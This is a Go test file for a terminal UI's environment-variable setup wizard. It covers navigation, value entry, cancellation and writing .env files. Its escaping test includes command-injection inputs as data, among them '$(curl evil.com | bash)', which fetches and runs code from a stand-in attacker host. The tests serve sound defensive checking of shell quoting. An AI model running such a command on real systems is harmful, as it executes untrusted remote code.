package tui

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/holdenhewett/romanesco/cli/internal/catalog"
	"github.com/holdenhewett/romanesco/cli/internal/installer"
)

// setupEnvDetail navigates to the MCP item detail and starts the inline env setup flow.
// This tests the inline flow (used post-install); pressing 'e' now opens the modal wizard instead.
func setupEnvDetail(t *testing.T) App {
	t.Helper()
	app := navigateToDetailItem(t, catalog.MCP, "test-mcp")

	// The MCP item should have an mcpConfig parsed
	if app.detail.mcpConfig == nil {
		t.Fatal("expected mcpConfig to be parsed for MCP item")
	}

	// Ensure env vars are unset so the wizard has work to do
	for k := range app.detail.mcpConfig.Env {
		os.Unsetenv(k)
	}

	// Switch to install tab
	m, _ := app.Update(keyRune('3')) // → Install tab
	app = m.(App)

	// Directly trigger the inline env setup flow (as used post-install).
	// Pressing 'e' now opens the modal wizard, not the inline flow.
	started := app.detail.startEnvSetup()
	if !started {
		t.Fatal("startEnvSetup() should return true when env vars are unset")
	}

	return app
}

func TestEnvSetupStart(t *testing.T) {
	app := navigateToDetailItem(t, catalog.MCP, "test-mcp")

	if app.detail.mcpConfig == nil {
		t.Fatal("mcpConfig should be parsed for MCP item")
	}

	// Unset the env vars so the wizard detects them
	for k := range app.detail.mcpConfig.Env {
		t.Setenv(k, "")
	}
	// Actually unset them (t.Setenv sets them, we need them unset)
	// Use a different approach: verify CheckEnvVars behavior
	envStatus := installer.CheckEnvVars(app.detail.mcpConfig)
	// At minimum, the mcpConfig should have env vars defined
	if len(envStatus) == 0 {
		t.Fatal("expected env vars in MCP config")
	}
}

func TestEnvChooseNewValue(t *testing.T) {
	app := setupEnvDetail(t)

	if app.detail.confirmAction != actionEnvChoose {
		t.Fatalf("expected actionEnvChoose, got %d", app.detail.confirmAction)
	}

	// Cursor at 0 = "Set up new", press enter
	app.detail.env.methodCursor = 0
	m, _ := app.Update(keyEnter)
	app = m.(App)

	if app.detail.confirmAction != actionEnvValue {
		t.Fatalf("expected actionEnvValue after choosing 'Set up new', got %d", app.detail.confirmAction)
	}
}

func TestEnvChooseAlreadyConfigured(t *testing.T) {
	app := setupEnvDetail(t)

	// Cursor at 1 = "Already configured", press enter
	app.detail.env.methodCursor = 1
	m, _ := app.Update(keyEnter)
	app = m.(App)

	if app.detail.confirmAction != actionEnvSource {
		t.Fatalf("expected actionEnvSource after choosing 'Already configured', got %d", app.detail.confirmAction)
	}
}

func TestEnvChooseNavigation(t *testing.T) {
	app := setupEnvDetail(t)

	if app.detail.env.methodCursor != 0 {
		t.Fatalf("expected initial envMethodCursor 0, got %d", app.detail.env.methodCursor)
	}

	m, _ := app.Update(keyDown)
	app = m.(App)
	if app.detail.env.methodCursor != 1 {
		t.Fatalf("expected envMethodCursor 1 after down, got %d", app.detail.env.methodCursor)
	}

	// Bounds clamping
	m, _ = app.Update(keyDown)
	app = m.(App)
	if app.detail.env.methodCursor != 1 {
		t.Fatal("envMethodCursor should clamp at 1")
	}

	m, _ = app.Update(keyUp)
	app = m.(App)
	if app.detail.env.methodCursor != 0 {
		t.Fatalf("expected envMethodCursor 0 after up, got %d", app.detail.env.methodCursor)
	}
}

func TestEnvChooseSkip(t *testing.T) {
	app := setupEnvDetail(t)

	initialIdx := app.detail.env.varIdx

	// Esc skips to the next var
	m, _ := app.Update(keyEsc)
	app = m.(App)

	if len(app.detail.env.varNames) > 1 {
		if app.detail.env.varIdx != initialIdx+1 {
			t.Fatalf("expected envVarIdx %d after skip, got %d", initialIdx+1, app.detail.env.varIdx)
		}
	}
}

func TestEnvValueInput(t *testing.T) {
	app := setupEnvDetail(t)

	// Navigate to value input
	app.detail.env.methodCursor = 0
	m, _ := app.Update(keyEnter)
	app = m.(App)

	if app.detail.confirmAction != actionEnvValue {
		t.Fatalf("expected actionEnvValue, got %d", app.detail.confirmAction)
	}

	// Type a value
	for _, r := range "my-api-key" {
		m, _ = app.Update(keyRune(r))
		app = m.(App)
	}

	// Enter → actionEnvLocation
	m, _ = app.Update(keyEnter)
	app = m.(App)

	if app.detail.confirmAction != actionEnvLocation {
		t.Fatalf("expected actionEnvLocation after value entry, got %d", app.detail.confirmAction)
	}
}

func TestEnvValueEsc(t *testing.T) {
	app := setupEnvDetail(t)

	// Navigate to value input
	app.detail.env.methodCursor = 0
	m, _ := app.Update(keyEnter)
	app = m.(App)

	// Esc at the app level calls CancelAction() which resets to actionNone
	// (the detail model's internal back-navigation is intercepted by the app)
	m, _ = app.Update(keyEsc)
	app = m.(App)

	if app.detail.confirmAction != actionNone {
		t.Fatalf("expected actionNone after esc from value (app cancels action), got %d", app.detail.confirmAction)
	}
}

func TestEnvLocationInput(t *testing.T) {
	app := setupEnvDetail(t)

	// Navigate: choose → value → type value → enter → location
	app.detail.env.methodCursor = 0
	m, _ := app.Update(keyEnter) // → value
	app = m.(App)
	for _, r := range "testval" {
		m, _ = app.Update(keyRune(r))
		app = m.(App)
	}
	m, _ = app.Update(keyEnter) // → location
	app = m.(App)

	if app.detail.confirmAction != actionEnvLocation {
		t.Fatalf("expected actionEnvLocation, got %d", app.detail.confirmAction)
	}

	// Enter with default path → advances to next var (writes to temp file)
	m, _ = app.Update(keyEnter)
	app = m.(App)

	// Should advance: either next env choose or actionNone
	if app.detail.confirmAction != actionEnvChoose && app.detail.confirmAction != actionNone {
		t.Fatalf("expected actionEnvChoose or actionNone after location, got %d", app.detail.confirmAction)
	}
}

func TestEnvLocationEsc(t *testing.T) {
	app := setupEnvDetail(t)

	// Navigate to location
	app.detail.env.methodCursor = 0
	m, _ := app.Update(keyEnter) // → value
	app = m.(App)
	for _, r := range "val" {
		m, _ = app.Update(keyRune(r))
		app = m.(App)
	}
	m, _ = app.Update(keyEnter) // → location
	app = m.(App)

	// Esc at the app level calls CancelAction() which resets to actionNone
	m, _ = app.Update(keyEsc)
	app = m.(App)

	if app.detail.confirmAction != actionNone {
		t.Fatalf("expected actionNone after esc from location (app cancels action), got %d", app.detail.confirmAction)
	}
}

func TestEnvSourceInput(t *testing.T) {
	app := setupEnvDetail(t)

	// Navigate to source (already configured path)
	app.detail.env.methodCursor = 1
	m, _ := app.Update(keyEnter) // → source
	app = m.(App)

	if app.detail.confirmAction != actionEnvSource {
		t.Fatalf("expected actionEnvSource, got %d", app.detail.confirmAction)
	}

	// Type a path to a .env file
	envFile := t.TempDir() + "/.env"
	// Create a test .env file
	writeTestEnvFile(t, envFile, app.detail.env.varNames[app.detail.env.varIdx], "test-secret-value")

	// Clear input and type new path
	app.detail.env.input.SetValue(envFile)
	m, _ = app.Update(keyEnter)
	app = m.(App)

	// Should advance to next var or finish
	if app.detail.confirmAction != actionEnvChoose && app.detail.confirmAction != actionNone {
		t.Fatalf("expected actionEnvChoose or actionNone, got %d", app.detail.confirmAction)
	}
}

func TestEnvSourceEsc(t *testing.T) {
	app := setupEnvDetail(t)

	// Navigate to source
	app.detail.env.methodCursor = 1
	m, _ := app.Update(keyEnter) // → source
	app = m.(App)

	// Esc at the app level calls CancelAction() which resets to actionNone
	m, _ = app.Update(keyEsc)
	app = m.(App)

	if app.detail.confirmAction != actionNone {
		t.Fatalf("expected actionNone after esc from source (app cancels action), got %d", app.detail.confirmAction)
	}
}

func TestEnvAllComplete(t *testing.T) {
	app := setupEnvDetail(t)

	// Skip all vars with Esc
	for app.detail.confirmAction == actionEnvChoose {
		m, _ := app.Update(keyEsc)
		app = m.(App)
	}

	// After all vars skipped, should be done
	if app.detail.confirmAction != actionNone {
		t.Fatalf("expected actionNone after all vars completed, got %d", app.detail.confirmAction)
	}
}

func TestSaveEnvToFile_Escaping(t *testing.T) {
	tests := []struct {
		name     string
		key      string
		value    string
		wantLine string
	}{
		{
			name:     "simple value",
			key:      "API_KEY",
			value:    "abc123",
			wantLine: "API_KEY='abc123'",
		},
		{
			name:     "value with single quote",
			key:      "MESSAGE",
			value:    "it's working",
			wantLine: "MESSAGE='it'\\''s working'",
		},
		{
			name:     "value with dollar sign",
			key:      "PATH_VAR",
			value:    "$HOME/bin",
			wantLine: "PATH_VAR='$HOME/bin'",
		},
		{
			name:     "value with backticks",
			key:      "CMD",
			value:    "`whoami`",
			wantLine: "CMD='`whoami`'",
		},
		{
			name:     "value with double quotes",
			key:      "QUOTED",
			value:    `say "hello"`,
			wantLine: `QUOTED='say "hello"'`,
		},
		{
			name:     "malicious command injection attempt",
			key:      "EVIL",
			value:    "$(curl evil.com | bash)",
			wantLine: "EVIL='$(curl evil.com | bash)'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tmpDir := t.TempDir()
			envFile := filepath.Join(tmpDir, ".env")

			m := detailModel{}
			if err := m.saveEnvToFile(tt.key, tt.value, envFile); err != nil {
				t.Fatalf("saveEnvToFile failed: %v", err)
			}

			data, err := os.ReadFile(envFile)
			if err != nil {
				t.Fatal(err)
			}

			content := strings.TrimSpace(string(data))
			if content != tt.wantLine {
				t.Errorf("got %q, want %q", content, tt.wantLine)
			}

			// Verify the format uses single quotes
			if !strings.HasPrefix(content, tt.key+"='") {
				t.Errorf("value should be single-quoted, got: %s", content)
			}
		})
	}
}

// writeTestEnvFile creates a .env file with a single var=value pair.
func writeTestEnvFile(t *testing.T, path, name, value string) {
	t.Helper()
	content := name + `="` + value + `"` + "\n"
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write test .env file: %s", err)
	}
}
